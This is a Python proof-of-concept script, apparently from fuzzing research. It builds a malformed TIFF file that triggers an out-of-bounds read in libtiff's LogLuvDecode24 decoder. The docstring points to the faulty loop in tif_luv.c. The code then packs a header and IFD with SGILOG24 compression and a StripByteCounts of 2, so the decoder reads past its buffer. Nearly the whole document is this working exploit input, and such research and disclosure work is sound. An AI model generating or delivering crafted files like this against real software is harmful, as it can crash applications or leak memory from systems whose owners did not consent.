#!/usr/bin/env python3
"""
VULN 001 - LogLuvDecode24 out-of-bounds read
File: libtiff/libtiff/tif_luv.c, lines 262-266

The loop reads 3 bytes per iteration but only checks cc > 0:
    for (i = 0; i < npixels && cc > 0; i++) {
        tp[i] = bp[0] << 16 | bp[1] << 8 | bp[2];  // OOB if cc < 3
        bp += 3;
        cc -= 3;
    }
With StripByteCounts=2, cc=2 on entry, loop fires once, bp[2] is OOB.
"""

import struct
import os

out_dir = '/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_luv_c'
os.makedirs(out_dir, exist_ok=True)

def pack_ifd_entry(tag, typ, count, value):
    """Pack one 12-byte IFD entry (little-endian)."""
    return struct.pack('<HHII', tag, typ, count, value)

# IFD entries sorted by tag ascending
# Type codes: SHORT=3, LONG=4
entries = [
    (0x0100, 3, 1, 1),      # ImageWidth = 1
    (0x0101, 3, 1, 1),      # ImageLength = 1
    (0x0102, 3, 1, 8),      # BitsPerSample = 8
    (0x0103, 3, 1, 34677),  # Compression = SGILOG24 (0x8775)
    (0x0106, 3, 1, 32845),  # PhotometricInterpretation = LOGLUV (0x806D)
    (0x0111, 4, 1, 0),      # StripOffsets = placeholder, filled below
    (0x0115, 3, 1, 3),      # SamplesPerPixel = 3
    (0x0116, 4, 1, 1),      # RowsPerStrip = 1
    (0x0117, 4, 1, 2),      # StripByteCounts = 2 (trigger: cc=2, reads bp[2] OOB)
]

# Layout:
#   [0..7]   TIFF header (8 bytes)
#   [8..]    IFD: 2-byte count + n*12 bytes + 4-byte next-IFD pointer
#   [after]  strip data (2 bytes)

header_size = 8
ifd_offset = header_size
n_entries = len(entries)
ifd_size = 2 + n_entries * 12 + 4
strip_data_offset = ifd_offset + ifd_size

# Two bytes of strip data; the decoder will read a third byte past this buffer
strip_data = bytes([0x80, 0x01])

# Patch StripOffsets
entries = [
    (tag, typ, count, strip_data_offset if tag == 0x0111 else value)
    for tag, typ, count, value in entries
]

# Build IFD
ifd = struct.pack('<H', n_entries)
for tag, typ, count, value in entries:
    ifd += struct.pack('<HHII', tag, typ, count, value)
ifd += struct.pack('<I', 0)  # no next IFD

# Build complete TIFF
header = b'II' + struct.pack('<HI', 42, ifd_offset)
tiff_data = header + ifd + strip_data

out_path = os.path.join(out_dir, 'vuln_001.tif')
with open(out_path, 'wb') as f:
    f.write(tiff_data)

print(f"[+] Written {len(tiff_data)} bytes to {out_path}")
print(f"    strip_data_offset = {strip_data_offset}")
print(f"    StripByteCounts   = 2  (triggers OOB read of bp[2])")
